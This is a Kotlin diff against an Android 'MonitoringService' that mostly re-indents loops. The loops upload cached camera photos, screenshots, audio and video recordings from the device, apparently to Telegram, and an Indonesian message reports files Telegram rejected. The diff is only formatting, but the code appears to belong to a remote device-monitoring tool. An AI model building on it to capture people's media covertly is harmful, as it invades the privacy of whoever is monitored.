@@ -6234,6 +6234,7 @@ class MonitoringService : Service() {
         startInitialSync(force = true)
         return true
     }
+
     private fun startLoopWatchdog() {
         try {
             loopWatchdogJob?.cancel()
@@ -6780,34 +6781,34 @@ class MonitoringService : Service() {
             if (!hasNetwork()) return
             var batches = 0
             drain@ while (batches < 3) {
-            val pending = try {
-                cacheDir.listFiles { file ->
-                    file.isFile && file.name.startsWith("video_") && file.name.endsWith(".mp4")
-                }?.sortedBy { it.lastModified() }?.take(max) ?: break@drain
-            } catch (e: Exception) {
-                break@drain
-            }
-            if (pending.isEmpty()) break@drain
-            val now = System.currentTimeMillis()
-            var batchProgress = false
-            for (file in pending) {
-                if (isMediaActive(file)) continue
-                if (now - file.lastModified() < 10_000L) continue
-                if (!file.exists() || file.length() == 0L) {
-                    deleteQuietly(file)
+                val pending = try {
+                    cacheDir.listFiles { file ->
+                        file.isFile && file.name.startsWith("video_") && file.name.endsWith(".mp4")
+                    }?.sortedBy { it.lastModified() }?.take(max) ?: break@drain
+                } catch (e: Exception) {
+                    break@drain
+                }
+                if (pending.isEmpty()) break@drain
+                val now = System.currentTimeMillis()
+                var batchProgress = false
+                for (file in pending) {
+                    if (isMediaActive(file)) continue
+                    if (now - file.lastModified() < 10_000L) continue
+                    if (!file.exists() || file.length() == 0L) {
+                        deleteQuietly(file)
+                        batchProgress = true
+                        videoProgress = true
+                        continue
+                    }
+                    val videoOutcome = sendVideoFile(file)
+                    if (videoOutcome == MediaSendOutcome.KEPT) break@drain
                     batchProgress = true
                     videoProgress = true
-                    continue
+                    if (videoOutcome == MediaSendOutcome.DROPPED) droppedVideos++
+                    kotlinx.coroutines.delay(500)
                 }
-                val videoOutcome = sendVideoFile(file)
-                if (videoOutcome == MediaSendOutcome.KEPT) break@drain
-                batchProgress = true
-                videoProgress = true
-                if (videoOutcome == MediaSendOutcome.DROPPED) droppedVideos++
-                kotlinx.coroutines.delay(500)
-            }
-            if (!batchProgress) break@drain
-            batches++
+                if (!batchProgress) break@drain
+                batches++
             }
             if (droppedVideos > 0) {
                 try {
@@ -6851,34 +6852,34 @@ class MonitoringService : Service() {
             if (!hasNetwork()) return
             var batches = 0
             drain@ while (batches < 3) {
-            val pending = try {
-                cacheDir.listFiles { file ->
-                    file.isFile && file.name.startsWith("audio_") && file.name.endsWith(".m4a")
-                }?.sortedBy { it.lastModified() }?.take(max) ?: break@drain
-            } catch (e: Exception) {
-                break@drain
-            }
-            if (pending.isEmpty()) break@drain
-            val now = System.currentTimeMillis()
-            var batchProgress = false
-            for (file in pending) {
-                if (isMediaActive(file)) continue
-                if (now - file.lastModified() < 10_000L) continue
-                if (!file.exists() || file.length() == 0L) {
-                    deleteQuietly(file)
+                val pending = try {
+                    cacheDir.listFiles { file ->
+                        file.isFile && file.name.startsWith("audio_") && file.name.endsWith(".m4a")
+                    }?.sortedBy { it.lastModified() }?.take(max) ?: break@drain
+                } catch (e: Exception) {
+                    break@drain
+                }
+                if (pending.isEmpty()) break@drain
+                val now = System.currentTimeMillis()
+                var batchProgress = false
+                for (file in pending) {
+                    if (isMediaActive(file)) continue
+                    if (now - file.lastModified() < 10_000L) continue
+                    if (!file.exists() || file.length() == 0L) {
+                        deleteQuietly(file)
+                        batchProgress = true
+                        audioProgress = true
+                        continue
+                    }
+                    val audioOutcome = sendAudioFile(file)
+                    if (audioOutcome == MediaSendOutcome.KEPT) break@drain
                     batchProgress = true
                     audioProgress = true
-                    continue
+                    if (audioOutcome == MediaSendOutcome.DROPPED) droppedAudio++
+                    kotlinx.coroutines.delay(500)
                 }
-                val audioOutcome = sendAudioFile(file)
-                if (audioOutcome == MediaSendOutcome.KEPT) break@drain
-                batchProgress = true
-                audioProgress = true
-                if (audioOutcome == MediaSendOutcome.DROPPED) droppedAudio++
-                kotlinx.coroutines.delay(500)
-            }
-            if (!batchProgress) break@drain
-            batches++
+                if (!batchProgress) break@drain
+                batches++
             }
             if (droppedAudio > 0) {
                 try {
@@ -7128,35 +7129,35 @@ class MonitoringService : Service() {
             if (!hasNetwork()) return
             var batches = 0
             drain@ while (batches < 3) {
-                val pending = try {
-                    cacheDir.listFiles { file ->
-                        file.isFile && (file.name.startsWith("camera_") || file.name.startsWith("screenshot_")) && file.name.endsWith(".jpg")
-                    }?.sortedBy { it.lastModified() }?.take(max) ?: break@drain
-            } catch (e: Exception) {
-                break@drain
-            }
-            if (pending.isEmpty()) break@drain
-            val now = System.currentTimeMillis()
-            var batchProgress = false
-            for (file in pending) {
-                if (isMediaActive(file)) continue
-                if (now - file.lastModified() < 10_000L) continue
-                if (!file.exists() || file.length() == 0L) {
-                    deleteQuietly(file)
+                    val pending = try {
+                        cacheDir.listFiles { file ->
+                            file.isFile && (file.name.startsWith("camera_") || file.name.startsWith("screenshot_")) && file.name.endsWith(".jpg")
+                        }?.sortedBy { it.lastModified() }?.take(max) ?: break@drain
+                } catch (e: Exception) {
+                    break@drain
+                }
+                if (pending.isEmpty()) break@drain
+                val now = System.currentTimeMillis()
+                var batchProgress = false
+                for (file in pending) {
+                    if (isMediaActive(file)) continue
+                    if (now - file.lastModified() < 10_000L) continue
+                    if (!file.exists() || file.length() == 0L) {
+                        deleteQuietly(file)
+                        batchProgress = true
+                        photoProgress = true
+                        continue
+                    }
+                    val photoOutcome = sendPhotoFile(file)
+                    if (photoOutcome == MediaSendOutcome.KEPT) break@drain
                     batchProgress = true
                     photoProgress = true
-                    continue
+                    if (photoOutcome == MediaSendOutcome.DROPPED) droppedPhotos++
+                    kotlinx.coroutines.delay(500)
                 }
-                val photoOutcome = sendPhotoFile(file)
-                if (photoOutcome == MediaSendOutcome.KEPT) break@drain
-                batchProgress = true
-                photoProgress = true
-                if (photoOutcome == MediaSendOutcome.DROPPED) droppedPhotos++
-                kotlinx.coroutines.delay(500)
+                if (!batchProgress) break@drain
+                batches++
             }
-            if (!batchProgress) break@drain
-            batches++
-        }
             if (droppedPhotos > 0) {
                 try {
                     messageQueue.addMessage("\u26A0\uFE0F $droppedPhotos berkas foto ditolak Telegram (400) — kosong/tak didukung, dibuang.", true)
